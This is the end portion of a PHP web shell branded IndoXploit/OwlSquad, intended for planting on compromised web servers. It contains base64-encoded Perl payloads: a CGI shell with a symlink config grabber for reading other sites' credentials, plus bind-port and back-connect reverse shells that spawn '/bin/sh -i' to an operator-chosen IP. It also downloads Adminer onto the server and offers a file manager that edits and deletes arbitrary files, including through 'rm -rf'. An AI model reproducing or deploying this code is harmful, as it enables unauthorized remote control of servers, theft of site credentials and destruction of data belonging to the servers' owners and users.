lcm55YS0kdHlwZWNvbmZpZy50eHQ0MDQvcHBxLnR4dCIpOyBjb3B5KCJzeW1saW5rX2NvbmZpZy9uZW11LnR4dCIsInN5bWxpbmtfY29uZmlnLyR1c2VybnlhLSR0eXBlY29uZmlnLnR4dDQwNC8uaHRhY2Nlc3MiKSA7IH0gfSBwcmludCAic3VjY2VzcyI7DQp9DQpzdWIgSGVscA0Kew0KcHJpbnQgIjxjb2RlPiBIb3cgVG8gVXNlciBTeW1saW5rICsgQ29uZmlnIEdyYWJiZXI/IEp1c3QgS2xpayBTeW1saW5rICsgQ29uZmlnIEdyYWJiZXI8YnI+IjsNCnByaW50ICIgVGhlbiBDaGVjayBEaXJzIEJ5IEVudGVyIFRoZSBVUkw8YnI+IjsNCnByaW50ICIgRXhhbXBsZTogc2l0ZS5jb20vY2dpZGlycy9zeW1saW5rX2NvbmZpZzxicj4iOw0KcHJpbnQgIiBGb3IgU3ltbGluayBKdXN0IEFkZCBJbiBVcmw8YnI+IjsNCnByaW50ICIgRXhhbXBsZTogc2l0ZS5jb20vY2dpZGlycy9zeW1saW5rX2NvbmZpZy9yb290LzwvY29kZT4iOw0KfQ0Kc3ViIFNlbmRGaWxlVG9Ccm93c2VyDQp7DQpsb2NhbCgkU2VuZEZpbGUpID0gQF87DQppZihvcGVuKFNFTkRGSUxFLCAkU2VuZEZpbGUpKSAjIGZpbGUgb3BlbmVkIGZvciByZWFkaW5nDQp7DQppZigkV2luTlQpDQp7DQpiaW5tb2RlKFNFTkRGSUxFKTsNCmJpbm1vZGUoU1RET1VUKTsNCn0NCiRGaWxlU2l6ZSA9IChzdGF0KCRTZW5kRmlsZSkpWzddOw0KKCRGaWxlbmFtZSA9ICRTZW5kRmlsZSkgPX4gbSEoW14vXlxcXSopJCE7DQpwcmludCAiQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi94LXVua25vd25cbiI7DQpwcmludCAiQ29udGVudC1MZW5ndGg6ICRGaWxlU2l6ZVxuIjsNCnByaW50ICJDb250ZW50LURpc3Bvc2l0aW9uOiBhdHRhY2htZW50OyBmaWxlbmFtZT0kMVxuXG4iOw0KcHJpbnQgd2hpbGUoPFNFTkRGSUxFPik7DQpjbG9zZShTRU5ERklMRSk7DQp9DQplbHNlICMgZmFpbGVkIHRvIG9wZW4gZmlsZQ0Kew0KJlByaW50UGFnZUhlYWRlcigiZiIpOw0KcHJpbnQgIjxjb2RlPkZhaWxlZCB0byBkb3dubG9hZCAkU2VuZEZpbGU6ICQhPC9jb2RlPiI7DQomUHJpbnRGaWxlRG93bmxvYWRGb3JtOw0KJlByaW50UGFnZUZvb3RlcjsNCn0NCn0NCg0KDQpzdWIgQmVnaW5Eb3dubG9hZA0Kew0KIyBnZXQgZnVsbHkgcXVhbGlmaWVkIHBhdGggb2YgdGhlIGZpbGUgdG8gYmUgZG93bmxvYWRlZA0KaWYoKCRXaW5OVCAmICgkVHJhbnNmZXJGaWxlID1+IG0vXlxcfF4uOi8pKSB8DQooISRXaW5OVCAmICgkVHJhbnNmZXJGaWxlID1+IG0vXlwvLykpKSAjIHBhdGggaXMgYWJzb2x1dGUNCnsNCiRUYXJnZXRGaWxlID0gJFRyYW5zZmVyRmlsZTsNCn0NCmVsc2UgIyBwYXRoIGlzIHJlbGF0aXZlDQp7DQpjaG9wKCRUYXJnZXRGaWxlKSBpZigkVGFyZ2V0RmlsZSA9ICRDdXJyZW50RGlyKSA9fiBtL1tcXFwvXSQvOw0KJFRhcmdldEZpbGUgLj0gJFBhdGhTZXAuJFRyYW5zZmVyRmlsZTsNCn0NCg0KaWYoJE9wdGlvbnMgZXEgImdvIikgIyB3ZSBoYXZlIHRvIHNlbmQgdGhlIGZpbGUNCnsNCiZTZW5kRmlsZVRvQnJvd3NlcigkVGFyZ2V0RmlsZSk7DQp9DQplbHNlICMgd2UgaGF2ZSB0byBzZW5kIG9ubHkgdGhlIGxpbmsgcGFnZQ0Kew0KJlByaW50RG93bmxvYWRMaW5rUGFnZSgkVGFyZ2V0RmlsZSk7DQp9DQp9DQpzdWIgVXBsb2FkRmlsZQ0Kew0KIyBpZiBubyBmaWxlIGlzIHNwZWNpZmllZCwgcHJpbnQgdGhlIHVwbG9hZCBmb3JtIGFnYWluDQppZigkVHJhbnNmZXJGaWxlIGVxICIiKQ0Kew0KJlByaW50UGFnZUhlYWRlcigiZiIpOw0KJlByaW50RmlsZVVwbG9hZEZvcm07DQomUHJpbnRQYWdlRm9vdGVyOw0KcmV0dXJuOw0KfQ0KJlByaW50UGFnZUhlYWRlcigiYyIpOw0KDQojIHN0YXJ0IHRoZSB1cGxvYWRpbmcgcHJvY2Vzcw0KcHJpbnQgIjxjb2RlPlVwbG9hZGluZyAkVHJhbnNmZXJGaWxlIHRvICRDdXJyZW50RGlyLi4uPGJyPiI7DQoNCiMgZ2V0IHRoZSBmdWxsbHkgcXVhbGlmaWVkIHBhdGhuYW1lIG9mIHRoZSBmaWxlIHRvIGJlIGNyZWF0ZWQNCmNob3AoJFRhcmdldE5hbWUpIGlmICgkVGFyZ2V0TmFtZSA9ICRDdXJyZW50RGlyKSA9fiBtL1tcXFwvXSQvOw0KJFRyYW5zZmVyRmlsZSA9fiBtIShbXi9eXFxdKikkITsNCiRUYXJnZXROYW1lIC49ICRQYXRoU2VwLiQxOw0KDQokVGFyZ2V0RmlsZVNpemUgPSBsZW5ndGgoJGlueydmaWxlZGF0YSd9KTsNCiMgaWYgdGhlIGZpbGUgZXhpc3RzIGFuZCB3ZSBhcmUgbm90IHN1cHBvc2VkIHRvIG92ZXJ3cml0ZSBpdA0KaWYoLWUgJFRhcmdldE5hbWUgJiYgJE9wdGlvbnMgbmUgIm92ZXJ3cml0ZSIpDQp7DQpwcmludCAiRmFpbGVkOiBEZXN0aW5hdGlvbiBmaWxlIGFscmVhZHkgZXhpc3RzLjxicj4iOw0KfQ0KZWxzZSAjIGZpbGUgaXMgbm90IHByZXNlbnQNCnsNCmlmKG9wZW4oVVBMT0FERklMRSwgIj4kVGFyZ2V0TmFtZSIpKQ0Kew0KYmlubW9kZShVUExPQURGSUxFKSBpZiAkV2luTlQ7DQpwcmludCBVUExPQURGSUxFICRpbnsnZmlsZWRhdGEnfTsNCmNsb3NlKFVQTE9BREZJTEUpOw0KcHJpbnQgIlRyYW5zZmVyZWQgJFRhcmdldEZpbGVTaXplIEJ5dGVzLjxicj4iOw0KcHJpbnQgIkZpbGUgUGF0aDogJFRhcmdldE5hbWU8YnI+IjsNCn0NCmVsc2UNCnsNCnByaW50ICJGYWlsZWQ6ICQhPGJyPiI7DQp9DQp9DQpwcmludCAiPC9jb2RlPiI7DQomUHJpbnRDb21tYW5kTGluZUlucHV0Rm9ybTsNCiZQcmludFBhZ2VGb290ZXI7DQp9DQoNCnN1YiBEb3dubG9hZEZpbGUNCnsNCiMgaWYgbm8gZmlsZSBpcyBzcGVjaWZpZWQsIHByaW50IHRoZSBkb3dubG9hZCBmb3JtIGFnYWluDQppZigkVHJhbnNmZXJGaWxlIGVxICIiKQ0Kew0KJlByaW50UGFnZUhlYWRlcigiZiIpOw0KJlByaW50RmlsZURvd25sb2FkRm9ybTsNCiZQcmludFBhZ2VGb290ZXI7DQpyZXR1cm47DQp9DQoNCiMgZ2V0IGZ1bGx5IHF1YWxpZmllZCBwYXRoIG9mIHRoZSBmaWxlIHRvIGJlIGRvd25sb2FkZWQNCmlmKCgkV2luTlQgJiAoJFRyYW5zZmVyRmlsZSA9fiBtL15cXHxeLjovKSkgfA0KKCEkV2luTlQgJiAoJFRyYW5zZmVyRmlsZSA9fiBtL15cLy8pKSkgIyBwYXRoIGlzIGFic29sdXRlDQp7DQokVGFyZ2V0RmlsZSA9ICRUcmFuc2ZlckZpbGU7DQp9DQplbHNlICMgcGF0aCBpcyByZWxhdGl2ZQ0Kew0KY2hvcCgkVGFyZ2V0RmlsZSkgaWYoJFRhcmdldEZpbGUgPSAkQ3VycmVudERpcikgPX4gbS9bXFxcL10kLzsNCiRUYXJnZXRGaWxlIC49ICRQYXRoU2VwLiRUcmFuc2ZlckZpbGU7DQp9DQoNCmlmKCRPcHRpb25zIGVxICJnbyIpICMgd2UgaGF2ZSB0byBzZW5kIHRoZSBmaWxlDQp7DQomU2VuZEZpbGVUb0Jyb3dzZXIoJFRhcmdldEZpbGUpOw0KfQ0KZWxzZSAjIHdlIGhhdmUgdG8gc2VuZCBvbmx5IHRoZSBsaW5rIHBhZ2UNCnsNCiZQcmludERvd25sb2FkTGlua1BhZ2UoJFRhcmdldEZpbGUpOw0KfQ0KfQ0KDQomUmVhZFBhcnNlOw0KJkdldENvb2tpZXM7DQoNCiRTY3JpcHRMb2NhdGlvbiA9ICRFTlZ7J1NDUklQVF9OQU1FJ307DQokU2VydmVyTmFtZSA9ICRFTlZ7J1NFUlZFUl9OQU1FJ307DQokUnVuQ29tbWFuZCA9ICRpbnsnYyd9Ow0KJFRyYW5zZmVyRmlsZSA9ICRpbnsnZid9Ow0KJE9wdGlvbnMgPSAkaW57J28nfTsNCg0KJEFjdGlvbiA9ICRpbnsnYSd9Ow0KJEFjdGlvbiA9ICJjb21tYW5kIiBpZigkQWN0aW9uIGVxICIiKTsNCg0KIyBnZXQgdGhlIGRpcmVjdG9yeSBpbiB3aGljaCB0aGUgY29tbWFuZHMgd2lsbCBiZSBleGVjdXRlZA0KJEN1cnJlbnREaXIgPSAkaW57J2QnfTsNCmNob3AoJEN1cnJlbnREaXIgPSBgJENtZFB3ZGApIGlmKCRDdXJyZW50RGlyIGVxICIiKTsNCmlmKCRBY3Rpb24gZXEgImNvbW1hbmQiKSAjIHVzZXIgd2FudHMgdG8gcnVuIGEgY29tbWFuZA0Kew0KJkV4ZWN1dGVDb21tYW5kOw0KfQ0KZWxzaWYoJEFjdGlvbiBlcSAidXBsb2FkIikgIyB1c2VyIHdhbnRzIHRvIHVwbG9hZCBhIGZpbGUNCnsNCiZVcGxvYWRGaWxlOw0KfQ0KZWxzaWYoJEFjdGlvbiBlcSAiZG93bmxvYWQiKSAjIHVzZXIgd2FudHMgdG8gZG93bmxvYWQgYSBmaWxlDQp7DQomRG93bmxvYWRGaWxlOw0KfQ0KZWxzaWYoJEFjdGlvbiBlcSAic3ltY29uZmlnIikNCnsNCiZQcmludFBhZ2VIZWFkZXI7DQpwcmludCAmU3ltQ29uZmlnOw0KfWVsc2lmKCRBY3Rpb24gZXEgImhlbHAiKQ0Kew0KJlByaW50UGFnZUhlYWRlcjsNCnByaW50ICZIZWxwOw0KfQ==";
	$cgi = fopen($file_cgi, "w");
	fwrite($cgi, base64_decode($cgi_script));
	fwrite($htcgi, $isi_htcgi);
	chmod($file_cgi, 0755);
        chmod($memeg, 0755);
	echo "<br><center>Done ... <a href='OwlSquad_cgi/cgi2.OwlSquad' target='_blank'>Klik Here</a>";
} elseif($_GET['do'] == 'adminer') {
	$full = str_replace($_SERVER['DOCUMENT_ROOT'], "", $dir);
	function adminer($url, $isi) {
		$fp = fopen($isi, "w");
		$ch = curl_init();
		 	  curl_setopt($ch, CURLOPT_URL, $url);
		 	  curl_setopt($ch, CURLOPT_BINARYTRANSFER, true);
		 	  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		 	  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
		   	  curl_setopt($ch, CURLOPT_FILE, $fp);
		return curl_exec($ch);
		   	  curl_close($ch);
		fclose($fp);
		ob_flush();
		flush();
	}
	if(file_exists('adminer.php')) {
		echo "<center><font color=#4c83af><a href='$full/adminer.php' target='_blank'>-> adminer login <-</a></font></center>";
	} else {
		if(adminer("https://www.adminer.org/static/download/4.2.4/adminer-4.2.4.php","adminer.php")) {
			echo "<center><font color=#4c83af><a href='$full/adminer.php' target='_blank'>-> adminer login <-</a></font></center>";
		} else {
			echo "<center><font color=red>gagal buat file adminer</font></center>";
		}
	}
} elseif($_GET['do'] == 'network') {
	echo "<form method='post'>
	<u>Bind Port:</u> <br>
	PORT: <input type='text' placeholder='port' name='port_bind' value='1337'>
	<input type='submit' name='sub_bp' value='>>'>
	</form>
	<form method='post'>
	<u>Back Connect:</u> <br>
	Server: <input type='text' placeholder='ip' name='ip_bc' value='".$_SERVER['REMOTE_ADDR']."'>  
	PORT: <input type='text' placeholder='port' name='port_bc' value='1337'>
	<input type='submit' name='sub_bc' value='>>'>
	</form>";
	$bind_port_p="IyEvdXNyL2Jpbi9wZXJsDQokU0hFTEw9Ii9iaW4vc2ggLWkiOw0KaWYgKEBBUkdWIDwgMSkgeyBleGl0KDEpOyB9DQp1c2UgU29ja2V0Ow0Kc29ja2V0KFMsJlBGX0lORVQsJlNPQ0tfU1RSRUFNLGdldHByb3RvYnluYW1lKCd0Y3AnKSkgfHwgZGllICJDYW50IGNyZWF0ZSBzb2NrZXRcbiI7DQpzZXRzb2Nrb3B0KFMsU09MX1NPQ0tFVCxTT19SRVVTRUFERFIsMSk7DQpiaW5kKFMsc29ja2FkZHJfaW4oJEFSR1ZbMF0sSU5BRERSX0FOWSkpIHx8IGRpZSAiQ2FudCBvcGVuIHBvcnRcbiI7DQpsaXN0ZW4oUywzKSB8fCBkaWUgIkNhbnQgbGlzdGVuIHBvcnRcbiI7DQp3aGlsZSgxKSB7DQoJYWNjZXB0KENPTk4sUyk7DQoJaWYoISgkcGlkPWZvcmspKSB7DQoJCWRpZSAiQ2Fubm90IGZvcmsiIGlmICghZGVmaW5lZCAkcGlkKTsNCgkJb3BlbiBTVERJTiwiPCZDT05OIjsNCgkJb3BlbiBTVERPVVQsIj4mQ09OTiI7DQoJCW9wZW4gU1RERVJSLCI+JkNPTk4iOw0KCQlleGVjICRTSEVMTCB8fCBkaWUgcHJpbnQgQ09OTiAiQ2FudCBleGVjdXRlICRTSEVMTFxuIjsNCgkJY2xvc2UgQ09OTjsNCgkJZXhpdCAwOw0KCX0NCn0=";
	if(isset($_POST['sub_bp'])) {
		$f_bp = fopen("/tmp/bp.pl", "w");
		fwrite($f_bp, base64_decode($bind_port_p));
		fclose($f_bp);

		$port = $_POST['port_bind'];
		$out = exe("perl /tmp/bp.pl $port 1>/dev/null 2>&1 &");
		sleep(1);
		echo "<pre>".$out."\n".exe("ps aux | grep bp.pl")."</pre>";
		unlink("/tmp/bp.pl");
	}
	$back_connect_p="IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGlhZGRyPWluZXRfYXRvbigkQVJHVlswXSkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRBUkdWWzFdLCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKTsNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgnL2Jpbi9zaCAtaScpOw0KY2xvc2UoU1RESU4pOw0KY2xvc2UoU1RET1VUKTsNCmNsb3NlKFNUREVSUik7";
	if(isset($_POST['sub_bc'])) {
		$f_bc = fopen("/tmp/bc.pl", "w");
		fwrite($f_bc, base64_decode($bind_connect_p));
		fclose($f_bc);

		$ipbc = $_POST['ip_bc'];
		$port = $_POST['port_bc'];
		$out = exe("perl /tmp/bc.pl $ipbc $port 1>/dev/null 2>&1 &");
		sleep(1);
		echo "<pre>".$out."\n".exe("ps aux | grep bc.pl")."</pre>";
		unlink("/tmp/bc.pl");
	}
} elseif($_GET['act'] == 'newfile') {
	if($_POST['new_save_file']) {
		$newfile = htmlspecialchars($_POST['newfile']);
		$fopen = fopen($newfile, "a+");
		if($fopen) {
			$act = "<script>window.location='?act=edit&dir=".$dir."&file=".$_POST['newfile']."';</script>";
		} else {
			$act = "<font color=red>permission denied</font>";
		}
	}
	echo $act;
	echo "<form method='post'>
	Filename: <input type='text' name='newfile' value='$dir/index.php' style='width: 450px;' height='10'>
	<input type='submit' name='new_save_file' value='Submit'>
	</form>";
} elseif($_GET['act'] == 'newfolder') {
	if($_POST['new_save_folder']) {
		$new_folder = $dir.'/'.htmlspecialchars($_POST['newfolder']);
		if(!mkdir($new_folder)) {
			$act = "<font color=red>permission denied</font>";
		} else {
			$act = "<script>window.location='?dir=".$dir."';</script>";
		}
	}
	echo $act;
	echo "<form method='post'>
	Folder Name: <input type='text' name='newfolder' style='width: 450px;' height='10'>
	<input type='submit' name='new_save_folder' value='Submit'>
	</form>";
} elseif($_GET['act'] == 'rename_dir') {
	if($_POST['dir_rename']) {
		$dir_rename = rename($dir, "".dirname($dir)."/".htmlspecialchars($_POST['fol_rename'])."");
		if($dir_rename) {
			$act = "<script>window.location='?dir=".dirname($dir)."';</script>";
		} else {
			$act = "<font color=red>permission denied</font>";
		}
	echo "".$act."<br>";
	}
	echo "<form method='post'>
	<input type='text' value='".basename($dir)."' name='fol_rename' style='width: 450px;' height='10'>
	<input type='submit' name='dir_rename' value='rename'>
	</form>";
} elseif($_GET['act'] == 'delete_dir') {
	if(is_dir($dir)) {
		if(is_writable($dir)) {
			@rmdir($dir);
			@exe("rm -rf $dir");
			@exe("rmdir /s /q $dir");
			$act = "<script>window.location='?dir=".dirname($dir)."';</script>";
		} else {
			$act = "<font color=red>could not remove ".basename($dir)."</font>";
		}
	}
	echo $act;
} elseif($_GET['act'] == 'view') {
	echo "Filename: <font color=#4c83af>".basename($_GET['file'])."</font> [ <a href='?act=view&dir=$dir&file=".$_GET['file']."'><b>view</b></a> ] [ <a href='?act=edit&dir=$dir&file=".$_GET['file']."'>edit</a> ] [ <a href='?act=rename&dir=$dir&file=".$_GET['file']."'>rename</a> ] [ <a href='?act=download&dir=$dir&file=".$_GET['file']."'>download</a> ] [ <a href='?act=delete&dir=$dir&file=".$_GET['file']."'>delete</a> ]<br>";
	echo "<textarea readonly>".htmlspecialchars(@file_get_contents($_GET['file']))."</textarea>";
} elseif($_GET['act'] == 'edit') {
	if($_POST['save']) {
		$save = file_put_contents($_GET['file'], $_POST['src']);
		if($save) {
			$act = "<font color=#4c83af>Saved!</font>";
		} else {
			$act = "<font color=red>permission denied</font>";
		}
	echo "".$act."<br>";
	}
	echo "Filename: <font color=#4c83af>".basename($_GET['file'])."</font> [ <a href='?act=view&dir=$dir&file=".$_GET['file']."'>view</a> ] [ <a href='?act=edit&dir=$dir&file=".$_GET['file']."'><b>edit</b></a> ] [ <a href='?act=rename&dir=$dir&file=".$_GET['file']."'>rename</a> ] [ <a href='?act=download&dir=$dir&file=".$_GET['file']."'>download</a> ] [ <a href='?act=delete&dir=$dir&file=".$_GET['file']."'>delete</a> ]<br>";
	echo "<form method='post'>
	<textarea name='src'>".htmlspecialchars(@file_get_contents($_GET['file']))."</textarea><br>
	<input type='submit' value='Save' name='save' style='width: 500px;'>
	</form>";
} elseif($_GET['act'] == 'rename') {
	if($_POST['do_rename']) {
		$rename = rename($_GET['file'], "$dir/".htmlspecialchars($_POST['rename'])."");
		if($rename) {
			$act = "<script>window.location='?dir=".$dir."';</script>";
		} else {
			$act = "<font color=red>permission denied</font>";
		}
	echo "".$act."<br>";
	}
	echo "Filename: <font color=#4c83af>".basename($_GET['file'])."</font> [ <a href='?act=view&dir=$dir&file=".$_GET['file']."'>view</a> ] [ <a href='?act=edit&dir=$dir&file=".$_GET['file']."'>edit</a> ] [ <a href='?act=rename&dir=$dir&file=".$_GET['file']."'><b>rename</b></a> ] [ <a href='?act=download&dir=$dir&file=".$_GET['file']."'>download</a> ] [ <a href='?act=delete&dir=$dir&file=".$_GET['file']."'>delete</a> ]<br>";
	echo "<form method='post'>
	<input type='text' value='".basename($_GET['file'])."' name='rename' style='width: 450px;' height='10'>
	<input type='submit' name='do_rename' value='rename'>
	</form>";
} elseif($_GET['act'] == 'delete') {
	$delete = unlink($_GET['file']);
	if($delete) {
		$act = "<script>window.location='?dir=".$dir."';</script>";
	} else {
		$act = "<font color=red>permission denied</font>";
	}
	echo $act;
} else {
	if(is_dir($dir) === true) {
		if(!is_readable($dir)) {
			echo "<font color=red>can't open directory. ( not readable )</font>";
		} else {
			echo '<table width="100%" class="table_home" border="0" cellpadding="3" cellspacing="1" align="center">
			<tr>
			<th class="th_home"><center>Name</center></th>
			<th class="th_home"><center>Type</center></th>
			<th class="th_home"><center>Size</center></th>
			<th class="th_home"><center>Last Modified</center></th>
			<th class="th_home"><center>Owner/Group</center></th>
			<th class="th_home"><center>Permission</center></th>
			<th class="th_home"><center>Action</center></th>
			</tr>';
			$scandir = scandir($dir);
			foreach($scandir as $dirx) {
				$dtype = filetype("$dir/$dirx");
				$dtime = date("F d Y g:i:s", filemtime("$dir/$dirx"));
				if(function_exists('posix_getpwuid')) {
					$downer = @posix_getpwuid(fileowner("$dir/$dirx"));
					$downer = $downer['name'];
				} else {
					//$downer = $uid;
					$downer = fileowner("$dir/$dirx");
				}
				if(function_exists('posix_getgrgid')) {
					$dgrp = @posix_getgrgid(filegroup("$dir/$dirx"));
					$dgrp = $dgrp['name'];
				} else {
					$dgrp = filegroup("$dir/$dirx");
				}
 				if(!is_dir("$dir/$dirx")) continue;
 				if($dirx === '..') {
 					$href = "<a href='?dir=".dirname($dir)."'>$dirx</a>";
 				} elseif($dirx === '.') {
 					$href = "<a href='?dir=$dir'>$dirx</a>";
 				} else {
 					$href = "<a href='?dir=$dir/$dirx'>$dirx</a>";
 				}
 				if($dirx === '.' || $dirx === '..') {
 					$act_dir = "<a href='?act=newfile&dir=$dir'>newfile</a> | <a href='?act=newfolder&dir=$dir'>newfolder</a>";
 					} else {
 					$act_dir = "<a href='?act=rename_dir&dir=$dir/$dirx'>rename</a> | <a href='?act=delete_dir&dir=$dir/$dirx'>delete</a>";
 				}
 				echo "<tr>";
 				echo "<td class='td_home'><img src='data:image/png;base64,R0lGODlhEwAQALMAAAAAAP///5ycAM7OY///nP//zv/OnPf39////wAAAAAAAAAAAAAAAAAAAAAA"."AAAAACH5BAEAAAgALAAAAAATABAAAARREMlJq7046yp6BxsiHEVBEAKYCUPrDp7HlXRdEoMqCebp"."/4YchffzGQhH4YRYPB2DOlHPiKwqd1Pq8yrVVg3QYeH5RYK5rJfaFUUA3vB4fBIBADs='>$href</td>";
				echo "<td class='td_home'><center>$dtype</center></td>";
				echo "<td class='td_home'><center>-</center></th></td>";
				echo "<td class='td_home'><center>$dtime</center></td>";
				echo "<td class='td_home'><center>$downer/$dgrp</center></td>";
				echo "<td class='td_home'><center>".w("$dir/$dirx",perms("$dir/$dirx"))."</center></td>";
				echo "<td class='td_home' style='padding-left: 15px;'>$act_dir</td>";
				echo "</tr>";
			}
		}
	} else {
		echo "<font color=red>can't open directory.</font>";
	}
		foreach($scandir as $file) {
			$ftype = filetype("$dir/$file");
			$ftime = date("F d Y g:i:s", filemtime("$dir/$file"));
			$size = filesize("$dir/$file")/1024;
			$size = round($size,3);
			if(function_exists('posix_getpwuid')) {
				$fowner = @posix_getpwuid(fileowner("$dir/$file"));
				$fowner = $fowner['name'];
			} else {
				//$downer = $uid;
				$fowner = fileowner("$dir/$file");
			}
			if(function_exists('posix_getgrgid')) {
				$fgrp = @posix_getgrgid(filegroup("$dir/$file"));
				$fgrp = $fgrp['name'];
			} else {
				$fgrp = filegroup("$dir/$file");
			}
			if($size > 1024) {
				$size = round($size/1024,2). 'MB';
			} else {
				$size = $size. 'KB';
			}
			if(!is_file("$dir/$file")) continue;
			echo "<tr>";
			echo "<td class='td_home'><img src='data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAAXNSR0IArs4c6QAAAAZiS0dEAP8A/wD/oL2nkwAAAAlwSFlzAAALEwAACxMBAJqcGAAAAAd0SU1FB9oJBhcTJv2B2d4AAAJMSURBVDjLbZO9ThxZEIW/qlvdtM38BNgJQmQgJGd+A/MQBLwGjiwH3nwdkSLtO2xERG5LqxXRSIR2YDfD4GkGM0P3rb4b9PAz0l7pSlWlW0fnnLolAIPB4PXh4eFunucAIILwdESeZyAifnp6+u9oNLo3gM3NzTdHR+//zvJMzSyJKKodiIg8AXaxeIz1bDZ7MxqNftgSURDWy7LUnZ0dYmxAFAVElI6AECygIsQQsizLBOABADOjKApqh7u7GoCUWiwYbetoUHrrPcwCqoF2KUeXLzEzBv0+uQmSHMEZ9F6SZcr6i4IsBOa/b7HQMaHtIAwgLdHalDA1ev0eQbSjrErQwJpqF4eAx/hoqD132mMkJri5uSOlFhEhpUQIiojwamODNsljfUWCqpLnOaaCSKJtnaBCsZYjAllmXI4vaeoaVX0cbSdhmUR3zAKvNjY6Vioo0tWzgEonKbW+KkGWt3Unt0CeGfJs9g+UU0rEGHH/Hw/MjH6/T+POdFoRNKChM22xmOPespjPGQ6HpNQ27t6sACDSNanyoljDLEdVaFOLe8ZkUjK5ukq3t79lPC7/ODk5Ga+Y6O5MqymNw3V1y3hyzfX0hqvJLybXFd++f2d3d0dms+qvg4ODz8fHx0/Lsbe3964sS7+4uEjunpqmSe6e3D3N5/N0WZbtly9f09nZ2Z/b29v2fLEevvK9qv7c2toKi8UiiQiqHbm6riW6a13fn+zv73+oqorhcLgKUFXVP+fn52+Lonj8ILJ0P8ZICCF9/PTpClhpBvgPeloL9U55NIAAAAAASUVORK5CYII='><a href='?act=view&dir=$dir&file=$dir/$file'>$file</a></td>";
			echo "<td class='td_home'><center>$ftype</center></td>";
			echo "<td class='td_home'><center>$size</center></td>";
			echo "<td class='td_home'><center>$ftime</center></td>";
			echo "<td class='td_home'><center>$fowner/$fgrp</center></td>";
			echo "<td class='td_home'><center>".w("$dir/$file",perms("$dir/$file"))."</center></td>";
			echo "<td class='td_home' style='padding-left: 15px;'><a href='?act=edit&dir=$dir&file=$dir/$file'>edit</a> | <a href='?act=rename&dir=$dir&file=$dir/$file'>rename</a> | <a href='?act=delete&dir=$dir&file=$dir/$file'>delete</a> | <a href='?act=download&dir=$dir&file=$dir/$file'>download</a></td>";
			echo "</tr>";
		}
		echo "</table>";
		if(!is_readable($dir)) {
			//
		} else {
			echo "<hr color='#4c83af'>";
		}
	echo "<center>Copyright © ".date("Y")." - <a href='http://indoxploit.or.id/' target='_blank'><font color=#4c83af>IndoXploit</font></a></center>";
}
?>
</html>
